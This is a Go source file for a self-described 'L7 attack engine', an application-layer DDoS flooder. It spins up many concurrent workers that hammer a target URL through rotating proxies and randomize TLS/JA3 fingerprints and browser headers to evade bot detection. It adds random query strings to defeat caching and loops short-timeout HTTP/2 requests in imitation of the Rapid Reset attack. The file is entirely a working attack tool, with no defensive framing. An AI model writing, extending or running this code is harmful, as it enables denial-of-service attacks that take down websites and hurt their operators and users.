package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

// Metrics represents real-time engine statistics
type Metrics struct {
	Attempted int64 `json:"attempted"`
	Completed int64 `json:"completed"`
	Failed    int64 `json:"failed"`
	Timeouts  int64 `json:"timeouts"`
}

// CoreEngine represents the high-performance L7 attack engine
type CoreEngine struct {
	Target   string
	Threads  int
	Duration int
	Method   string
	ProxyMgr *ProxyManager
	UseH2    bool
	StopChan chan bool
	Metrics  *Metrics
}

func main() {
	target := flag.String("target", "", "Target URL")
	threads := flag.Int("threads", 50, "Number of concurrent threads")
	duration := flag.Int("duration", 60, "Duration in seconds")
	method := flag.String("method", "GET", "HTTP Method")
	proxyFile := flag.String("proxies", "config/proxies.json", "Path to proxy file")
	useH2 := flag.Bool("h2", true, "Use HTTP/2 with JA3 spoofing")
	flag.Parse()

	if *target == "" {
		fmt.Println("Usage: go_engine --target <url> [options]")
		os.Exit(1)
	}

	pm := NewProxyManager(*proxyFile)
	engine := &CoreEngine{
		Target:   *target,
		Threads:  *threads,
		Duration: *duration,
		Method:   *method,
		ProxyMgr: pm,
		UseH2:    *useH2,
		StopChan: make(chan bool),
		Metrics:  &Metrics{},
	}

	engine.Run()
}

func (e *CoreEngine) Run() {
	// Periodic metrics reporting for Python orchestrator
	go func() {
		for {
			select {
			case <-e.StopChan:
				return
			case <-time.After(2 * time.Second):
				data, _ := json.Marshal(e.Metrics)
				fmt.Printf("METRICS:%s\n", string(data))
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < e.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			e.attackLoop(id)
		}(i)
	}

	time.Sleep(time.Duration(e.Duration) * time.Second)
	close(e.StopChan)
	wg.Wait()
	
	finalData, _ := json.Marshal(e.Metrics)
	fmt.Printf("FINAL_METRICS:%s\n", string(finalData))
}

func (e *CoreEngine) attackLoop(id int) {
	// Pre-calculate fingerprints for this worker to reduce overhead
	fingerprints := []utls.ClientHelloID{
		utls.HelloChrome_102,
		utls.HelloFirefox_102,
		utls.HelloChrome_Auto,
		utls.HelloFirefox_Auto,
		utls.HelloSafari_Auto,
	}

	for {
		select {
		case <-e.StopChan:
			return
		default:
			proxyStr := e.ProxyMgr.GetRandomProxy()
			fp := fingerprints[rand.Intn(len(fingerprints))]
			
			client, err := e.createCoreClient(proxyStr, fp)
			if err != nil {
				atomic.AddInt64(&e.Metrics.Failed, 1)
				continue
			}

			// Rapid Reset Simulation: Open stream and close immediately
			for j := 0; j < 50; j++ {
				req, _ := http.NewRequest(e.Method, e.Target, nil)
				e.applyEliteHeaders(req)
				
				// Using the client with H2 transport will handle streams
				// Rapidly creating and closing request bodies or using short timeouts
				// simulates the Rapid Reset frame behavior in high-level Go.
				ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
				req = req.WithContext(ctx)
				
				resp, err := client.Do(req)
				cancel()
				
				if err == nil {
					if resp.StatusCode >= 200 && resp.StatusCode < 400 {
						atomic.AddInt64(&e.Metrics.Completed, 1)
					} else {
						atomic.AddInt64(&e.Metrics.Failed, 1)
					}
					resp.Body.Close()
				} else {
					atomic.AddInt64(&e.Metrics.Timeouts, 1)
				}
				atomic.AddInt64(&e.Metrics.Attempted, 1)
			}
		}
	}
}

func (e *CoreEngine) createCoreClient(proxyStr string, fp utls.ClientHelloID) (*http.Client, error) {
	var dialer net.Dialer
	dialer.Timeout = 5 * time.Second

	var proxyURL *url.URL
	if proxyStr != "" {
		if !strings.Contains(proxyStr, "://") {
			proxyStr = "http://" + proxyStr
		}
		proxyURL, _ = url.Parse(proxyStr)
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, err
			}
			
			// FIX: Proper SNI (ServerName) in TLS config
			u, _ := url.Parse(e.Target)
			tlsConfig := &utls.Config{
				InsecureSkipVerify: true,
				ServerName:         u.Hostname(), // Ensure SNI is set from Target URL
			}

			// Dynamic JA3/TLS Fingerprinting
			uConn := utls.UClient(conn, tlsConfig, fp)
			if err := uConn.Handshake(); err != nil {
				conn.Close()
				return nil, err
			}
			return uConn, nil
		},
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns: 1000,
		IdleConnTimeout: 90 * time.Second,
		DisableKeepAlives: false,
	}

	if e.UseH2 {
		http2.ConfigureTransport(transport)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}, nil
}

func (e *CoreEngine) applyEliteHeaders(req *http.Request) {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}

	req.Header.Set("User-Agent", uas[rand.Intn(len(uas))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	
	// Bypass simple caching
	q := req.URL.Query()
	q.Set(fmt.Sprintf("ver_%d", rand.Intn(100000)), fmt.Sprintf("%d", rand.Intn(100000)))
	req.URL.RawQuery = q.Encode()
}
